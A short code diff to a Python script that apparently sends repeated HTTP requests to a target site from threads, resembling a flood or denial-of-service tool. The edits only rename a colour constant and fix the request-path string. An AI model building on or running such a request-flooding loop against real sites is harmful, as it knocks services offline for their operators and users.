@@ -14,6 +14,7 @@ os.system("clear")
 
 # Color
 class bcolors:
+    ZA = '\033[97m'
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
     OKCYAN = '\033[96m'
@@ -26,7 +27,6 @@ class bcolors:
     RESET = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
-    ZH = '\033[97m'
 
 # CLEAR
 os.system("clear")
@@ -66,7 +66,7 @@ class MyThread(Thread,):
         while not self.kill_received:
             server = socket.gethostbyname(self.site)
             post = 'x' == 9999
-            file = '\'
+            file = '/'
 
             request = '%s /%s HTTP/1.1\r\n' %(self.method.upper(),file)
             request += 'Host: %s\r\n' % (self.site)
